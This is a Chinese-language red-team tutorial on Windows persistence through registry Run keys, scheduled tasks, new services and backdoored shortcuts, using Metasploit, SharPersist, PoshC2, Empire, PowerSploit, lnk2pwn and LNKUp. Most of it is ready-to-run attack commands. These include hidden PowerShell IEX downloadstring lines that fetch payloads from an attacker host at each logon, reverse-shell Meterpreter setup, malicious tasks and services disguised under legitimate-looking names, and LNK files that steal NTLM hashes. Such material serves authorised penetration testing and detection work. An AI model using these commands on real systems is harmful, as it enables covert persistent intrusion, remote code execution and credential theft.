## 注册表运行键

在Windows登录期间创建将执行任意负载的注册表项是红队游戏手册中最古老的技巧之一。

### 命令行

注册表项可以从终端添加到运行键以实现持久性。这些键将包含对用户登录时将执行的实际负载的引用，已知使用此持久性方法的威胁因素和红队使用一下注册表位置

> reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v  
> Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"  
> reg add
> "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v  
> Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"  
> reg add  
> "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v  
> Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"  
> reg add  
>
> "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
> /v  
> Pentestlab /t REG_SZ /d "C:\Users\pentestlab\pentestlab.exe"

![wKg0C2Q2EUANX2AAACGspXsNY726.png](https://image.3001.net/images/20230614/1686722877_6489593d9d228fa96c47b.png!small)

注册表–当前用户的Run键

如果已获得提升的凭据，则最好使用本地计算机注册表位置，而不是当前用户，因为有效负载将在每次系统启动时执行，而与使用系统身份验证的用户无关。

> reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
> /v  
> Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"  
> reg add
> "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce"  
> /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"  
> reg add  
> "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices"
> /v  
> Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"  
> reg add  
>
> "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"  
> /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"

![wKg0C2Q2EVAbOXOAACt3a5oEY4592.png](https://image.3001.net/images/20230614/1686722878_6489593e2174d00100510.png!small)

注册表–本地计算机Run键

在下一次登录期间，有效负载将执行并与回传给Meterpeter。

![wKg0C2Q2EWAdFkoAAB3LU0Lm7I418.png](https://image.3001.net/images/20230614/1686722878_6489593ec68f58ccf7f19.png!small)

Meterpreter –Run键

另外两个注册表位置，这些位置可以允许红队通过执行任意有效负载或DLL来实现持久性。这些将在登录期间执行，并且需要管理员级别的特权。

> reg add  
>
> "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001"
> /v  
> Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"  
> reg add  
>
> "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Dep  
> end" /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.dll"

![wKg0C2Q2EX6ARXN8AABQl1xB1KE423.png](https://image.3001.net/images/20230614/1686722879_6489593f45bef6c0670f9.png!small)

Meterpreter –任意DLL

#### Metasploit

Metasploit Framework通过使用Meterpreter脚本和后期利用模块来支持通过注册表的持久性。

Meterpreter脚本将以VBS脚本的形式创建一个有效负载，该负载将被拖放到磁盘上，并将创建一个注册表项，该注册表项将在用户登录期间运行该有效负载。

> run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 443 -r
> 10.0.2.21

![wKg0C2Q2EYyABschAACoRfe9L34537.png](https://image.3001.net/images/20230614/1686722879_6489593fb4e3905418e32.png!small)

Metasploit-Meterpreter持久性脚本

用户下次登录系统时，将打开一个新的Meterpreter会话

![wKg0C2Q2EZiAcrZAABJKvNJxUg294.png](https://image.3001.net/images/20230614/1686722880_64895940304ab985a2379.png!small)

Metasploit-Meterpreter会话

另外，还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系统上的可写位置

> use post/windows/manage/persistence_exe  
> set REXEPATH /tmp/pentestlab.exe  
> set SESSION 2  
> set STARTUP USER  
> set LOCALEXEPATH C:\tmp  
> run

![wKg0C2Q2EcCAWGTJAACIJz6DId4096.png](https://image.3001.net/images/20230614/1686722880_64895940a15791720db69.png!small)

Metasploit-持久性利用后开发模块配置

由于已选择**`USER`**作为选项，该模块将使用当前用户的注册表位置

![wKg0C2Q2EcyAf9kAACAEDZOngk364.png](https://image.3001.net/images/20230614/1686722881_648959410e8884ff0cde5.png!small)

Metasploit-持久性后期开发模块

如果已获得系统级别得特权，则可以将该模块配置为在**`HKLM`**位置中创建注册表项。

该**`STARTUP`**选项将需要改变系统。

> set STARTUP SYSTEM

![wKg0C2Q2EdaAXsBNAAB1uXDIC8I550.png](https://image.3001.net/images/20230614/1686722881_648959418f6e82b57202a.png!small)

Metasploit-作为系统的持久性模块

#### SharPersist

SharPersist[https://github.com/fireeye/SharPersist](https://www.sec-in.com/outLinkPage/?target=https://github.com/fireeye/SharPersist),

Brett Hawkins[https://twitter.com/h4wkst3r](https://www.sec-in.com/outLinkPage/?target=https://twitter.com/h4wkst3r)在C＃中开发的工具，它结合了多种持久性技术，包括添加注册表运行键。

该工具包可以加载到支持反射加载的各种命令和控制框架中，例如Cobalt Strike和PoshC2。

以下命令将创建一个注册表项，该注册表项将从与Metasploit Framework模块相同的注册表位置执行任意  
有效负载。

> SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c  
> C:\tmp\pentestlab.exe" -k "hkcurun" -v "pentestlab" -m add

![wKg0C2Q2EeaAQtRFAABHwXTNZgo054.png](https://image.3001.net/images/20230614/1686722881_64895941f324bbf95549c.png!small)

SharPersist –以用户身份注册

如果已获得提升得访问权限，请修改命令以在本地计算机位置中安装注册表项，以实现所有用户的持久性。

>   * SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c
>   * C:\tmp\pentestlab.exe" -k "hklmrun" -v "pentestlab" -m add -o env
>

![wKg0C2Q2EfWAcYxYAABHWbs1J1E154.png](https://image.3001.net/images/20230614/1686722882_6489594270dc23155fc05.png!small)

SharPersist –注册为SYSTEM

SharPersist还通过**`RunOnce`和`RunOnceEx`**注册表项包含持久性功能。以下命令将在这些位置创建注册表项，这些注册表项将执行任意有效负载

>   * SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c
>   * pentestlab.exe" -k "hklmrunonce" -v "Pentestlab" -m add
>   * SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c
>   * pentestlab.exe" -k "hklmrunonceex" -v "Pentestlab" -m add
>   * SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c
>   * pentestlab.exe" -k "hkcurunonce" -v "Pentestlab" -m add
>

![wKg0C2Q2EjCAVhysAACwcrnCh0358.png](https://image.3001.net/images/20230614/1686722882_64895942e3889f63cb72c.png!small)

SharPersist – RunOnce注册表项

SharPersist还提供了使用另一个注册表位置进行持久化的选项**`（UserInitMprLogonScript）`**。

>   * SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c
>   * pentestlab.exe" -k "logonscript" -m add
>

![wKg0C2Q2EjqALapQAABSIUvgxeE316.png](https://image.3001.net/images/20230614/1686722883_648959436029db571d787.png!small)

SharPersist –登录脚本

#### PoshC2

PoshC2支持各种持久性功能，包括注册表运行键的方法。以下命令将在目标主机中创建两个注册表项。

> install-persistence

![wKg0C2Q2EkaAYqg5AAA1IcgTrqo693.png](https://image.3001.net/images/20230614/1686722883_64895943c5a6551f6418d.png!small)

PoshC2 –持久性

注册表的”运行“项将具有IEDpdate的名称，以便看起来合法，第二个注册表项将作为墙纸隐藏在注册表中

![wKg0C2Q2ElmAdEdUAABqcq0woSg799.png](https://image.3001.net/images/20230614/1686722884_64895944396a2400c16c9.png!small)

PoshC2 –注册表运行键

#### Empire

如果将Empire用作命令和控件，Empire包含两个与通过注册表运行项与持久性技术对齐的模块。根据特权级别，这些模块将尝试在以下注册表位置中安装base64有效负载：

> HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug  
> HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug

![wKg0C2Q2EmWAL0EJAABtLiWCAvY797.png](https://image.3001.net/images/20230614/1686722884_64895944a8fcf3028ea5a.png!small)

Empire – Debug 注册表项有效负载

> usemodule persistence/userland/registry  
> usemodule persistence/elevated/registry*

![wKg0C2Q2F9aAU3hpAABeAVxBHpg780.png](https://image.3001.net/images/20230614/1686722885_6489594522922526714d2.png!small)

Empire –Persistence Registry Module

将在名称****Updater下创建另一个注册表项，该注册表项将包含要执行的命令。PowerShell将尝试在下次登录时运行Debug密钥中存储的有效负载，以实现持久性。

> HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run  
> HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run

![wKg0C2Q2FuAPrgkAAC3J5xWMk333.png](https://image.3001.net/images/20230614/1686722885_648959458bf9f59681655.png!small)

Empire – Registry Run Key

## 计划任务

windows操作系统提供了一个实用程序（schtasks.exe）,使系统管理员能够在特定的日期和时间执行程序或脚本。这种行为可作为一种持久性机制被****red
team利用。通过计划任务执行持久性，不需要管理员权限。但如果已获取提升的权限，则允许进一步操作，例如在用户登录期间或在空闲状态期间执行任务

计划任务的持久化技术可以手动实现，也可以自动实现。有效负载可以从磁盘或远程位置执行。

它们可以是可执行文案金、powershell脚本或是scriptlet的形式。

这被认为是一种旧的持久性技术，但是它任然可以在****red team场景中使用，并且由各种开源工具支持

Metasploit和web_delivery模块可用于托管和生成各种格式的有效载荷

>   * use exploit/multi/script/web_delivery
>   * set payload windows/x64/meterpreter/reverse_tcp
>   * set LHOST 10.0.2.21
>   * set target 5
>   * exploit
>

在命令提示符下，”schtasks“可执行文件可用于创建计划任务，该任务将在每个windows登录中以system的形式下载并执行基于powershell的有效负载

>   * schtasks /create /tn PentestLab /tr
>   * "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle
>   * hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object
>   *
> net.webclient).downloadstring(''[http://10.0.2.21:8080/ZPWLywg](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21:8080/ZPWLywg)'''))'"
>   * /sc onlogon /ru System
>

![wKg0C2Q2GCSALvB7AAA4jH40JM754.png](https://image.3001.net/images/20230614/1686722886_64895946535312d362e78.png!small)

命令提示符--持久性计划任务

当用户再次使用系统登录时，将执行有效负载，并打开meterpreter会话

![wKg0C2Q2GHuAUq4AAEGaPypmY0615.png](https://image.3001.net/images/20230614/1686722886_64895946c14823ab4e80d.png!small)

Meterpreter – 持久性计划任务

也可以在系统启动期间或用户会话处于非活动状态（空闲模式）时执行

> #(X64) - On System Start  
> schtasks /create /tn PentestLab /tr  
> "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle  
> hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object  
>
> net.webclient).downloadstring(''[http://10.0.2.21:8080/ZPWLywg](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21:8080/ZPWLywg)'''))'"**  
> **/sc onstart /ru System
>
> #(X64) - On User Idle (30mins)  
> schtasks /create /tn PentestLab /tr  
> "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle  
> hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object  
>
> net.webclient).downloadstring(''[http://10.0.2.21:8080/ZPWLywg](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21:8080/ZPWLywg)'''))'"**  
> **/sc onidle /i 30
>
> #(X86) - On User Login  
> schtasks /create /tn PentestLab /tr  
> "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle  
> hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object  
>
> net.webclient).downloadstring(''[http://10.0.2.21:8080/ZPWLywg](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21:8080/ZPWLywg)'''))'"**  
> **/sc onlogon /ru System
>
> #(X86) - On System Start  
> schtasks /create /tn PentestLab /tr  
> "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle  
> hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object  
>
> net.webclient).downloadstring(''[http://10.0.2.21:8080/ZPWLywg](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21:8080/ZPWLywg)'''))'"
>
> /sc onstart /ru System
>
> #(X86) - On User Idle (30mins)  
> schtasks /create /tn PentestLab /tr  
> "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle  
> hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object  
>
> net.webclient).downloadstring(''[http://10.0.2.21:8080/ZPWLywg](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21:8080/ZPWLywg)'''))'" /sc onidle
> /i 30

有效负载的执行也可以在特定的时间发生，并且可以具有到期日期和自删除功能。“schtasks”实用程序提供了必要的选项，因为它是其功能的一部分。

> schtasks /CREATE /TN "Windows Update" /TR  
> "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle  
> hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object  
>
> net.webclient).downloadstring(''[http://10.0.2.21:8080/ZPWLywg](https://www.sec-> in.com/outLinkPage/?target=http://10.0.2.21:8080/ZPWLywg)'''))'"  
> /SC minute /MO 1 /ED 04/11/2019 /ET 06:53 /Z /IT /RU %USERNAME%

![wKg0C2Q2GLCAbekAABJqN0u4DA016.png](https://image.3001.net/images/20230614/1686722887_648959477f3709f300021.png!small)

持续性–计划任务日期和时间

果为目标事件启用了事件日志记录，则可以在特定的Windows事件中触发任务。b33f在他的网站上演示了此技术。Windows事件命令行实用程序可用于查询事件ID

> wevtutil qe Security /f:text /c:1 /q:"Event[System[(EventID=4647)]]

![wKg0C2Q2GN6AZepAAACuCAcDhhA688.png](https://image.3001.net/images/20230614/1686722887_64895947e32f8bc2210d0.png!small)

查询事件ID

可以创建一个计划任务，该任务将在系统上发生关联的事件ID时执行有效负载。

> schtasks /Create /TN OnLogOff /TR C:\tmp\pentestlab.exe /SC ONEVENT /EC
> Security /MO "*[System[(Level=4 or Level=0) and (EventID=4634)]]"

![wKg0C2Q2GP2ACt0AABaLmHguWI758.png](https://image.3001.net/images/20230614/1686722888_64895948a06f1e092b1d6.png!small)

持久性–计划任务事件ID

“查询”参数可用于检索新创建的计划任务的信息

> schtasks /Query /tn OnLogOff /fo List /v

![wKg0C2Q2GSCAMwGBAACO3eGRokE558.png](https://image.3001.net/images/20230614/1686722889_648959491c46a3a084cc7.png!small)

查询计划任务

当用户管理员注销时，将创建事件ID，并在下次登录时执行有效负载。

![wKg0C2Q2GSuAGuehAACpjtCQJ4075.png](https://image.3001.net/images/20230614/1686722889_648959498ad486a38c619.png!small)

计划任务注销– Meterpreter

或者，可以使用PowerShell创建计划任务，这些任务将在用户登录时或在特定时间和日期执行。

![wKg0C2Q2GT2ADCEbAAB3KzAvXek542.png](https://image.3001.net/images/20230614/1686722890_6489594a151e4845d68fa.png!small)

![wKg0C2Q2GVqAWglyAACwJ5UpWbA520.png](https://image.3001.net/images/20230614/1686722890_6489594a7c10315455a6e.png!small)

持久性计划任务– PowerShell

### SharPersist

github项目地址：[https://github.com/fireeye/SharPersist](https://www.sec-in.com/outLinkPage/?target=https://github.com/fireeye/SharPersist)

通过计划任务在SharPersist中添加了关于持久性的多种功能。如果用户具有管理员级别的特权，则以下命令可以创建一个新的计划任务，该任务将在Windows登录期间执行。

> SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c  
> C:\tmp\pentestlab.exe" -n "PentestLab" -m add -o logon

![wKg0C2Q2GWuAQWU6AABB8GViY0687.png](https://image.3001.net/images/20230614/1686722891_6489594b0eeb0646c5320.png!small)

SharPersist –新计划任务登录

在系统的下一次重新引导中，有效负载将执行，并且Meterpreter会话将打开。

![wKg0C2Q2GdeADBryAABmJBGCItk840.png](https://image.3001.net/images/20230614/1686722891_6489594bc791201597758.png!small)

Meterpreter – SharPersist计划任务

SharPersist也可用于列出特定的计划任务，以识别所有者，触发器和要执行的动作。

> SharPersist -t schtask -m list -n "PentestLab"

![wKg0C2Q2GeOAHYaAABuRl4bP30427.png](https://image.3001.net/images/20230614/1686722892_6489594c8c4c86b85a660.png!small)

SharPersist –列表计划任务

或者，仅使用“ list ”选项而不指定名称将枚举系统上所有现有的计划任务。

> SharPersist -t schtask -m list

![wKg0C2Q2GgqAGPPlAABPjeyMIHw153.png](https://image.3001.net/images/20230614/1686722893_6489594d0fc04b4e98cb1.png!small)

SharPersist –列表计划任务

类似于Metasploit Framework功能，该功能具有检查目标是否易受攻击以及漏洞利用能否成功执行的功能，SharPersist具有空运行检查。

通过检查名称和提供的参数，此功能可用于验证调度任务命令。

> SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c
> C:\tmp\pentestlab.exe" -n "PentestLab" -m check

![wKg0C2Q2GheAMG0bAAAe71EE94492.png](https://image.3001.net/images/20230614/1686722893_6489594d6f68b072544e3.png!small)

SharPersist –检查计划任务

SharPersist还可以枚举登录期间将执行的所有计划任务。此命令可用于主机的态势感知期间，并确定是否存在可以修改以运行有效负载而不是创建新任务的现有计划任务。

> SharPersist -t schtaskbackdoor -m list -o logon

![wKg0C2Q2GiOALorKAABgeCjdAmU694.png](https://image.3001.net/images/20230614/1686722893_6489594de6043d954c4bd.png!small)

SharPersist –列出登录计划任务

该schtaskbackdoor功能与检查相结合的参数可以识别，如果一个特定的计划任务已后门。

> SharPersist.exe -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c
> C:\tmp\pentestlab.exe" -n "PentestLab" -m check

![wKg0C2Q2GjeAOAR2AABHLjtjbIQ792.png](https://image.3001.net/images/20230614/1686722894_6489594e544aab28d9236.png!small)

SharPersist –检查后门计划任务

“Add”参数将后门现有的计划任务，该任务将执行恶意命令，而不是执行更隐蔽的持久性选项来执行  
合法动作。

> "/c C:\tmp\pentestlab.exe" -n "ReconcileLanguageResources" -m add

![wKg0C2Q2GkSAMSBnAABGUmiZrHg798.png](https://image.3001.net/images/20230614/1686722894_6489594ec1ca46a5d5af8.png!small)

SharPersist –后门计划任务

### Empire

Empire根据活动代理的特权包含两个模块，这些模块可用于实施计划任务的持久性技术。

以下配置每天凌晨03:22将执行基于PowerShell的有效负载。有效负载存储在注册表项中，任务名称为“WindowsUpdate
”，以便区分合法的计划任务。

>   * usemodule persistence/userland/schtasks
>   * set Listener http
>   * set TaskName WindowsUpdate
>   * set DailyTime 03:22
>   * execute
>

![wKg0C2Q2GlmAFvrcAAEEJj7ASak861.png](https://image.3001.net/images/20230614/1686722895_6489594f3d7f881ae1e6e.png!small)

Empire – 持久性计划任务

计划任务的提升模块提供了在用户登录期间执行有效负载的选项。在这两个模块中，都将使用注册表以Base64编码格式存储有效负载，但是以不同的注册表项存储。

>   * usemodule persistence/elevated/schtasks*
>   * set Listener http
>

![wKg0C2Q2GpGAVauEAAB7ZDIHncY997.png](https://image.3001.net/images/20230614/1686722895_6489594fb460796ec26ff.png!small)

Empire Elevated – 持久性计划任务

### PowerSploit

PowerSploit的持久性模块支持各种功能，可用于向脚本或脚本块添加持久性功能。在添加持久性之前，需要配置高架选项和用户选项。

> $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -Hourly  
> $UserOptions = New-UserPersistenceOption -ScheduledTask -Hourly  
> Add-Persistence -FilePath C:\temp\empire.exe -ElevatedPersistenceOption  
> $ElevatedOptions -UserPersistenceOption $UserOptions

![wKg0C2Q2GsiAERN0AABFez7glR4619.png](https://image.3001.net/images/20230614/1686722896_6489595024120da91e1a3.png!small)

PowerSploit –计划任务

## 创建新服务

如果未正确配置windows环境中的服务或这些服务可以用作持久性方法，则这些服务可能导致权限提升

创建一个新的服务需要管理员级别的权限，它已经不是隐藏的持久性技术。

然而，在红队的行动中，针对那些在威胁检测方面还不成熟的公司，可以用来制造进一步的干扰，企业应创建SOC能力，以识别在其恶意软件中使用基本技术的威胁

### 命令行实现

如果帐户具有本地管理员特权，则可以从命令提示符创建服务。参数“ binpath ”用于执行任意有效负载，而参数“ auto ”用于确保恶意服务将自动启动。

> sc create pentestlab binpath= "cmd.exe /k C:\temp\pentestlab.exe"
> start="auto" obj="LocalSystem" sc start pentestlab

![wKg0C2Q2GzGAYx5hAAAuAcRRIfw349.png](https://image.3001.net/images/20230614/1686722896_648959508dbb3d80572e0.png!small)

CMD –新服务

或者，可以直接从PowerShell创建新服务。

> New-Service -Name "pentestlab" -BinaryPathName "C:\temp\pentestlab.exe"
> -Description "PentestLaboratories" -StartupType Automatic sc start
> pentestlab

![wKg0C2Q2G2iARgJpAAA8MvDJmms193.png](https://image.3001.net/images/20230614/1686722897_64895951341b44403e1ea.png!small)

PowerShell持久性–新服务

在两种情况下，启动服务时都会打开Meterpreter会话。

![wKg0C2Q2G3qAai1SAABcWiwiCsY144.png](https://image.3001.net/images/20230614/1686722897_648959519cb41ca742e3d.png!small)

Meterpreter –新服务

### SharPersist

[https://github.com/fireeye/SharPersist](https://www.sec-in.com/outLinkPage/?target=https://github.com/fireeye/SharPersist)

SharPersist支持在受感染系统中创建新服务的持久性技术。在系统上安装新服务需要提升的访问权限（本地管理员）。

以下命令可用于添加新服务，该服务将在Windows启动期间作为本地系统执行任意有效负载。

> SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c
> pentestlab.exe" -n "pentestlab" -m add

![wKg0C2Q2HPWAFpWuAABegACIUTk422.png](https://image.3001.net/images/20230614/1686722898_648959522be0ae1f63057.png!small)

SharPersist –添加服务

Meterpreter会话将再次建立，或者与任何其他能够与有效负载进行通信的命令和控制框架建立连接。

![wKg0C2Q2HV6AVQO8AABBqdgKzEA087.png](https://image.3001.net/images/20230614/1686722898_648959529fcd87aa42393.png!small)

SharPersist –通过服务的计费器

### PowerSploit

[https://github.com/PowerShellMafia/PowerSploit](https://www.sec-in.com/outLinkPage/?target=https://github.com/PowerShellMafia/PowerSploit)

PowerSploit可用于对合法服务进行后门程序以实现持久性。可以利用两个PowerShell函数来修改现有服务的二进制路径，或者从先前手动创建的自定义服务中修改二进制路径，以执行任意有效负载。

>   * Set-ServiceBinPath -Name pentestlab -binPath "cmd.exe /k
> C:\temp\pentestlab.exe"
>   * Write-ServiceBinary -Name pentestlab -Command "cmd.exe /k
> C:\temp\pentestlab.exe"
>

![wKg0C2Q2HWuAItYYAABSkrUwc08740.png](https://image.3001.net/images/20230614/1686722899_648959531b6783b397dd9.png!small)

PowerSploit –持久性

### PoshC2

[https://github.com/nettitude/PoshC2_Python](https://www.sec-in.com/outLinkPage/?target=https://github.com/nettitude/PoshC2_Python)

PoshC2还具有创建新服务作为持久性技术的能力。但是，将执行base-64 PowerShell负载，而不是任意可执行文件。

从植入物处理机，以下模块将自动执行该技术

> install-servicelevel-persistence

![wKg0C2Q2HYCAGz5TAAAueUseDLE101.png](https://image.3001.net/images/20230614/1686722899_648959537e8a918871505.png!small)

PoshC2持久性–安装新服务

PoshC2将自动生成有效负载，并且该命令将在目标系统上执行以创建新服务。

![wKg0C2Q2HZiAcQxBAAJxO7Uchg914.png](https://image.3001.net/images/20230614/1686722899_64895953e787f8e11b6e2.png!small)

PoshC2持久性–新服务

该服务将自动启动，并具有名称“ CheckpointServiceUpdater ”，以使其看起来合法。

![wKg0C2Q2HgWAW08nAAEgaQiPSCI073.png](https://image.3001.net/images/20230614/1686722900_6489595485fdaf4e66ddc.png!small)

PoshC2持久性–创建新服务

### Metasploit

Metasploit框架具有一个后开发模块，该模块支持两种持久性技术。

[https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/](https://www.sec-in.com/outLinkPage/?target=https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)

  1. 注册表运行键[上方链接]
  2. 新服务

需要将启动变量修改为SERVICE，以便在系统上安装新服务。

> use post/windows/manage/persistence_exe  
> set REXEPATH /tmp/pentestlab.exe  
> set SESSION 1  
> set STARTUP SERVICE  
> set LOCALEXEPATH C:\tmp  
> run

![wKg0C2Q2HqyAMduYAADE5FpsN9w864.png](https://image.3001.net/images/20230614/1686722901_648959551d29dc360b759.png!small)

Metasploit持久性模块–服务

需要Metasploit多重/处理程序模块来捕获有效负载并与受感染的主机建立Meterpreter会话。

![wKg0C2Q2HriAaZsPAABXIkIDJc977.png](https://image.3001.net/images/20230614/1686722901_648959558dc3c7094b967.png!small)

Metasploit Meterpreter –通过新服务的持久性

## 快捷方式修改

windows快捷方式包含对系统上安装的软件或文件位置（网络或本地）的引用

从恶意软件出现之初，便已将快捷方式用作执行恶意代码以实现持久性的一种方法

快捷方式的文件扩展名是.LNK，它为红队提供了很多机会来执行各种格式的代码（exe，vbs，Powershell，scriptlet等）或窃取NTLM哈  
希

更隐蔽的方法是修改现有合法快捷方式的属性，但是生成具有不同特征的快捷方式可以为代码执行提供灵活性

### Empire

Empire包含一个持久性模块，该模块可以后门合法的快捷方式（.LNK），以执行任意的PowerShell有效负载。现有快捷方式的目标字段将被修改以执行存储在注册表项中base64脚本

> usemodule persistence/userland/backdoor_lnk

![wKg0C2Q2HsmAAgUrAACVKYSEEc444.png](https://image.3001.net/images/20230614/1686722902_648959560e01946564c8d.png!small)

Empire–后门现有快捷方式

查看快捷方式的属性将显示目标字段已成功修改以执行PowerShell有效负载

![wKg0C2Q2H7OADVXaAADL5l6oFqU143.png](https://image.3001.net/images/20230614/1686722902_648959568dcefc4152440.png!small)

Empire-修改后的快捷方式

由于快捷方式存在于启动文件夹中，因此暂存器将在下一次Windows登录中执行，并且将与命令和控制服务器建立连接。

![wKg0C2Q2H8aAQscyAAA7NCt4m3Y723.png](https://image.3001.net/images/20230614/1686722903_648959571531cf778eecd.png!small)

Empire-通过快捷方式成功上线

但是，Empire包含一个可用于生成具有LNK文件格式的暂存器的模块。

> usestager windows/launcher_lnk  
> set Listener http  
> execute

![wKg0C2Q2ryAJs9OAACyjfa49g945.png](https://image.3001.net/images/20230614/1686722903_6489595785d1a5353d09c.png!small)

Empire-创建快捷方式

默认情况下，此模块将使用写字板图标伪装成可信任的应用程序。

![wKg0C2Q2sAaAGu8aAAAqntvmoTI573.png](https://image.3001.net/images/20230614/1686722904_648959580e5f951a1e1cd.png!small)

Empire-写字板快捷方式

快捷方式的目标字段将使用执行Base64有效负载的PowerShell命令填充。可以将快捷方式转移并移动到启动文件夹中以保持持久性

![wKg0C2Q2sBKAWAc3AAB5XJsx37w866.png](https://image.3001.net/images/20230614/1686722904_64895958729e677fa3f6e.png!small)

Empire-快捷属性

### SharPersist

[https://github.com/fireeye/SharPersist](https://www.sec-in.com/outLinkPage/?target=https://github.com/fireeye/SharPersist)

SharPersist能够创建Internet Explorer快捷方式，该快捷方式将执行任意有效负载并将其放置在启动文件夹中以实现持久性。

> SharPersist.exe -t startupfolder -c "cmd.exe" -a "/c C:\temp\pentestlab.exe"
> -f "pentestlab" -m add

![wKg0C2Q2sFuAHbMfAABd0sYyF08244.png](https://image.3001.net/images/20230614/1686722904_64895958e104222a74804.png!small)

SharPersist –快捷方式

当用户进行身份验证时，将执行有效负载，并打开Meterpreter会话.

![wKg0C2Q2sGaAKt3hAABVc0JcdU235.png](https://image.3001.net/images/20230614/1686722905_64895959595b540230625.png!small)

SharPersist – Meterpreter

### PoshC2

PoshC2可以创建一个LNK文件并将其直接放置在Windows启动文件夹中以保持持久性。

可以通过执行以下命令来调用此技术：

> install-persistence 3

![wKg0C2Q2sHCAA0FmAAAsW2KDJrE335.png](https://image.3001.net/images/20230614/1686722905_64895959c27b0e8461125.png!small)

PoshC2 –启动LNK文件

在Windows登录期间，快捷方式将尝试在注册表项上执行值，该注册表项包含base64格式的stager。

![wKg0C2Q2sHqAX5eLAABlNq1IH2E857.png](https://image.3001.net/images/20230614/1686722906_6489595a2c0548a593873.png!small)

PoshC2 –快捷方式

## 杂项

在常见的红色团队工具包之外，还有多个脚本可用于开发恶意快捷方式。将这些快捷方式放置在启动文件夹中以保持持久性将是一个微不足道的过程，因为假定已经存在与命令和控制服务器的通信。

[https://github.com/it-gorillaz/lnk2pwn](https://www.sec-in.com/outLinkPage/?target=https://github.com/it-gorillaz/lnk2pwn)

lnk2pwn是用Java编写的工具，可用于制作恶意快捷方式。可以通过命令控制台在生成快捷方式期间嵌入任意命令

> java -jar lnk2pwn.jar

![wKg0C2Q2sISAEJsBAACBS4gzfCk805.png](https://image.3001.net/images/20230614/1686722906_6489595a97e7ad69a7c43.png!small)

lnk2pwn – GUI

默认情况下，lnk2pwn将生成伪造的记事本快捷方式，但是可以轻松更改图标

![wKg0C2Q2sWGAOQxhAAAsFumXR9U986.png](https://image.3001.net/images/20230614/1686722907_6489595b112687da39e15.png!small)

lnk2pwn –假记事本快捷方式

[https://github.com/Plazmaz/LNKUp](https://www.sec-in.com/outLinkPage/?target=https://github.com/Plazmaz/LNKUp)

使用LNKUp python脚本可以实现类似的结果，该脚本可以生成可以执行任意命令或窃取目标用户的NTLM哈希的快捷方式

> python generate.py --host 10.0.2.21 --type ntlm --output out.lnk

![wKg0C2Q2sXSAScSrAADOvLRmHOY287.png](https://image.3001.net/images/20230614/1686722907_6489595b7a063195f0264.png!small)

LNKUp – NTLM哈希快捷方式

由于生成的LNK文件将包含UNC路径，因此需要使用响应器，或者具有捕获NTLM哈希值的Metasploit模块。

> use auxiliary/server/capture/smb

![wKg0C2Q2sX2AJEedAADmUeVjI5E974.png](https://image.3001.net/images/20230614/1686722907_6489595bed7201ec722b7.png!small)

LNKUp – NTLM捕获

